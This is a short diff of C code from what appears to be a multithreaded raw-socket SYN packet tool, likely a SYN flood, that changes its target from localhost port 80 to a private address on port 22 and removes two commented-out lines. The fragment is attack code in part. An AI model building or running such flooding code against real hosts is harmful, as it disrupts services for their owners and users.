@@ -2,8 +2,8 @@
 
 
 void *thread_handler(void *arg){
-    const char *server_ip = "127.0.0.1";
-    uint16_t port = 80;
+    const char *server_ip = "10.42.0.185";
+    uint16_t port = 22;
 
     int sd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
     if(sd == -1){
@@ -27,10 +27,8 @@ void *thread_handler(void *arg){
 
     fill_SYN(iphead, tcphead, dest_addr.sin_addr.s_addr, dest_addr.sin_port);
 
-    //uint32_t rand = (uint32_t) arg;
     // initialize rng
     srand(*((uint32_t*) arg));
-    //randomize_src(iphead, *rand);
 
     byte *ip_stream = serialize_ip_header(iphead);
     byte *tcp_stream = serialize_tcp_header(tcphead);
